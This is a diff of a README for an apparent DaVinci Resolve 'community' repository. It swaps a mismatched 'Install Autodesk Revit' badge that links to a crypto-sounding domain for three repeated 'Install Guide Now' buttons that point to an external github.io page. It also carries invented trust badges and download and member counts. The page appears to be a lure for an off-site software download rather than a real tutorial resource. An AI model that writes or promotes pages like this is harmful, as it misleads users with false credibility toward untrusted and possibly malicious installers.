@@ -1,10 +1,14 @@
-![Trusted](https://img.shields.io/badge/Trusted-100%25-lightgrey?style=plastic&labelColor=lightgrey&color=grey) ![Downloads](https://img.shields.io/badge/Downloads-1M%2B-lightgrey?style=plastic&labelColor=lightgrey&color=grey) ![Release](https://img.shields.io/badge/Release-2025-orange?style=plastic&labelColor=lightgrey&color=orange)  
+# 🎥 DaVinci Resolve Community
 
-# 🎥 DaVinciResolveStudioHub  
+![Visitors: 65K+](https://img.shields.io/badge/Visitors-65K+-blue) ![Members: 42K+](https://img.shields.io/badge/Members-42K+-green) ![Established: 2025](https://img.shields.io/badge/Established-2025-orange)
+
+![DaVinciResolveCommunity Banner](https://i.ytimg.com/vi/vVafsvBRmF4/maxresdefault.jpg)
 
 📽️ Master professional video editing with DaVinci Resolve 19 in 2025! This repository offers tutorials, resources, and tips for creators to explore DaVinci Resolve’s tools for editing, color grading, and visual effects. Join our community of filmmakers and editors to elevate your projects!  
 
-[![Install Autodesk Revit](https://img.shields.io/badge/Install-DaVinci-blueviolet)](https://ton-stake.net)  
+<a href="https://filmcrafthub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ---
 
@@ -18,7 +22,9 @@
 - ✅ **Community Hub**: Connect with video editors and creators.  
 - ✅ **Workflow Tips**: Optimize your editing process.  
 
----
+<a href="https://filmcrafthub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ### 💻 System Requirements  
 
@@ -28,7 +34,9 @@
 - **Processor**: Multi-core Intel/AMD (3.0GHz+)  
 - **Graphics**: NVIDIA/AMD GPU with 4GB VRAM (8GB recommended)  
 
----
+<a href="https://filmcrafthub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ### 🌟 What Makes It Great  
 
